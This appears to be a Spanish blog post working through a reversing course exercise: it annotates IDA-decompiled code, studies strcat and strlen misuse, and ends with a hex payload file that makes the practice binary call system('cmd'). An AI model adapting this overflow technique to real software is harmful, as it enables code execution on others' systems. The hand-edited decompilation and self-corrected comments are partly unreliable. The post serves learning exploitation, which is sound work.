---
title: "Ricardo Narvaja Reversing: Buffer overflow examen 9"
date: 2024-08-24T05:09:01-03:00
tags: ['ricardo','narvaja','reversing','examen','ida']
---

### Este reto usa vfprintf
```c
#include <stdarg.h>                                                             
#include <stdio.h>                                                              
                                                                                
void vout(FILE *stream, char *fmt, ...);                                        
char fmt1 [] = "%s  %s  %s\n";                                                  
                                                                                
int main(void)                                                                  
{                                                                               
   FILE *stream;                                                                
   stream = fopen("myfile.dat", "w");                                           
                                                                                
   vout(stream, fmt1, "Sat", "Sun", "Mon");                                     
}                                                                               
                                                                                
void vout(FILE *stream, char *fmt, ...)                                         
                                                                                
{                                                                               
   va_list arg_ptr;                                                             
                                                                                
   va_start(arg_ptr, fmt);                                                      
   vfprintf(stream, fmt, arg_ptr);                                              
   va_end(arg_ptr);                                                             
}                                                                               
```

printf que me decompilo el ida:
```c
int printf(char *Format, ...)
{
  FILE *v1; // eax
  va_list va; // [esp+14h] [ebp+Ch] BYREF

  va_start(va, Format);
  sub_401000();
  v1 = _acrt_iob_func(1u);
  return vfprintf(v1, Format, 0, va);
}
```



### Esto me generó el IDA con algunos retoques:
```c

// Overfloodea cuando cargo el caracter 169
char *this_106(char *this)
{
  this[106] = "A ejecutar la calculadora de nuevo...\n";
  // De acá tenés que saltar a Destination[4] == 'Q' 
  return this;
}

int check_0(char *Destination, int a2)
{
  // Concatena(une) la cadena Destination con la posición 106 de la cadena destination
  // Estas siguientes expresiones son equivalentes.
  // *(Destination+100) = Destination[100]

  // NO está concatenandolo con Destination+106, lo está concatenando con sólo un byte

  // strcat espera un puntero como 1er y 2do argumento, acá le pasan es una posición del buffer, o sea le estás pasando la posición de memoria de donde querés que lea, podemos apuntar Destination[106] a cualquier lado
  strcat(Destination, Destination[106]); // Supuestamente le agrega 1 byte que es el byte modificado por la función this_106, en realidad esto rompe todo. Todo lo que está abajo no se ejecutará.

  // Compara si el valor del tamaño del buffer Destination vale 56 bytes.
  // Este if nunca será verdadero porque no existe el caracter nulo porque strcat lo eliminó, por lo tanto tenemos que pisar el return address y saltar a if Destination[4] == 'Q'
  // ME EQUIVOQUÉ SI ES VERDADERO AUNQUE ES RARISIMO PORQUE this[106] sólo debería permitirme cargar 1 byte y en Linux con gcc todo lo que está debajo del strcat no se ejecuta.
  if ( strlen(Destination) == 56 )
  {
    if ( Destination[4] == 'I' )
    {
      // Si lo es llama a printf e imprime la cadena a partir de la posición 254 para adelante.
      *(Destination + 52) = printf;

      // Esto 
      (*(Destination + 52))(Destination + 254);
      // es lo mismo que :
      printf(Destination + 254);

    }
    // Lo mismo con los demás, sólo imprime texto.

    if ( Destination[4] == 'P' )
    {
      *(Destination + 53) = printf;
      (*(Destination + 53))(Destination + 254);
    }
    if ( Destination[4] == 'Q' )
    {
      // a2 = system. system(Destination+254) acá llama a system y pasa como argumento cualquier cosa que hay después de Destination+254. Entonces tenemos que pisar esa dirección con "calc.exe"

      *(Destination + 54) = a2;
      // a2 es un puntero a system

      // Tenemos que hacer una llamada como:
      // system("calc.exe");

      // Esto
      (*(Destination + 54))(Destination + 254);
      // Es lo mismo que 
      system(Destination + 254);
      // Destination + 254 = hace referencia al buffer, si miramos en el ida en la pila del stack, para llegar al buffer necesitamos 25 bytes más es decir: Destination+225 = buffer, lo podemos comprobar mirando la pila de la variable botón derecho array y dándole 224 bytes hasta que el buffer queda abajo. Destination[225] = Buffer[0] 
      // 54-25 = 29 entonces Destination[254] = Buffer[29] entonces buffer[29] = "calc.exe"

    }

    if ( Destination[4] == 'R' )
    {
      *(Destination + 55) = printf;
      (*(Destination + 55))(Destination + 254);
    }
  }
  return 0;
}


int __cdecl check(char *Destination, int a2)
{
  // v7 pasa a ser a2 en esta función
  // a2 es un puntero a system, ¿como hacemos para que se ejecute la calculadora?
  check_0(Destination, a2);

  return 0;
}


int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *Destination[56]; // [esp+0h] [ebp-1B0h] BYREF
  char Buffer[200]; // [esp+E0h] [ebp-D0h] BYREF
  const char *v6; // [esp+1A8h] [ebp-8h]
  int v7; // [esp+1ACh] [ebp-4h]

  this_106(Destination);
  Destination[52] = printf;
  printf(v6);
  v7 = printf;
  memset(Buffer, 0, sizeof(Buffer));
  memset(Destination, 0, 200u);
  // Empieza a leer el contenido del archivo y lo carga a partir de la posición 51
  Destination[51] = fopen("example.txt", "rb");
  if ( !Destination[51] )
  {
    (Destination[52])("No se puede leer el archivo bye bye \n");
    exit(1);
  }
  // De destination lo carga a buffer 
  fread(Buffer, 200u, 1u, Destination[51]);
  // y de buffer a destination otra vez.
  strcpy(Destination, Buffer);
  // Verifica si la posición 0 del buffer vale 0, es decir hay que desbordarla para pisar esa parte.
  if ( SLOBYTE(Destination[0]) == '0' )
    v7 = system;
  check(Destination, v7);
  (Destination[52])(&Buffer[30]);
  return 0;
}
```


### Pequeño estudio de lo que pasa cuando usamos strcat con una posición de un buffer
```c
#include <stdio.h>
#include <string.h>

int main(){
	char prueba[6] = {'h','o','l','a','\0'};

	strcat(prueba,prueba[3]);
	// Lo que hará será transformar 'a' a hexadecimal que es 61. Entonces va a puntar a 0x61 va a concatenar prueba con lo que sea que está en la posición de memoria 0x61 (o sea nada).

	printf("prueba: %x\n",prueba);
	return 0;
}
```

### Otro pequeño estudio de strcat
```c

#include <stdio.h>
#include <string.h>


int main(){
	char prueba[7] = {'h','o','l','a',' ','\0'};
	// Estas expresiones son equivalentes
	char asdf[] = "mundo\n";
	char asdf1[7] = {'m','u','n','d','o','\n','\0'};

	// strcat borra el caracter nulo del 1er argumento, entonces cuando vos concatenás con un caracter estás borrando el caracter nulo del primer argumento y lo dejás sin fin de cadena, eso hace que el strlen no funcione porque no encuentra el fin de cadena.
	strcat(prueba,asdf);
	
	// Lo que hará será transformar 'a' a hexadecimal que es 61. Entonces va a puntar a 0x61 va a concatenar prueba con lo que sea que está en la posición de memoria 0x61 (o sea nada).

	printf("prueba: %s\n",prueba);
	return 0;
}

```


### Implementación de strcat en C
```c
char * strcat(char *dest, const char *src)
{
    size_t i,j;
    for (i = 0; dest[i] != '\0'; i++)
        ;
    for (j = 0; src[j] != '\0'; j++)
        dest[i+j] = src[j];
    dest[i+j] = '\0';
    return dest;
}
```

### Implementación de strlen en C
```c
size_t custom_strlen(const char* str) {
    size_t len = 0;
    while (*str != '\0') {
        len++;
        str++;
    }
    return len;
}
```


#### Exploit
En vez de ejecutar la calculadora ejecuté cmd porque estoy bajo linux y wine no tiene calc. Tuve que poner un 00 en la posición 17 porque strcpy copia hasta encontrar un `00` y así `18+38=56` 38 es la longitud de `A ejecutar la calculadora de nuevo...\n`

```
00000000: 3051 5151 5151 5151 5151 5151 5151 5151  0QQQQQQQQQQQQQQQ
00000010: 5151 0051 5151 5151 5151 5151 5151 636d  QQ.QQQQQQQQQQQcm
00000020: 6400                                     d.
```
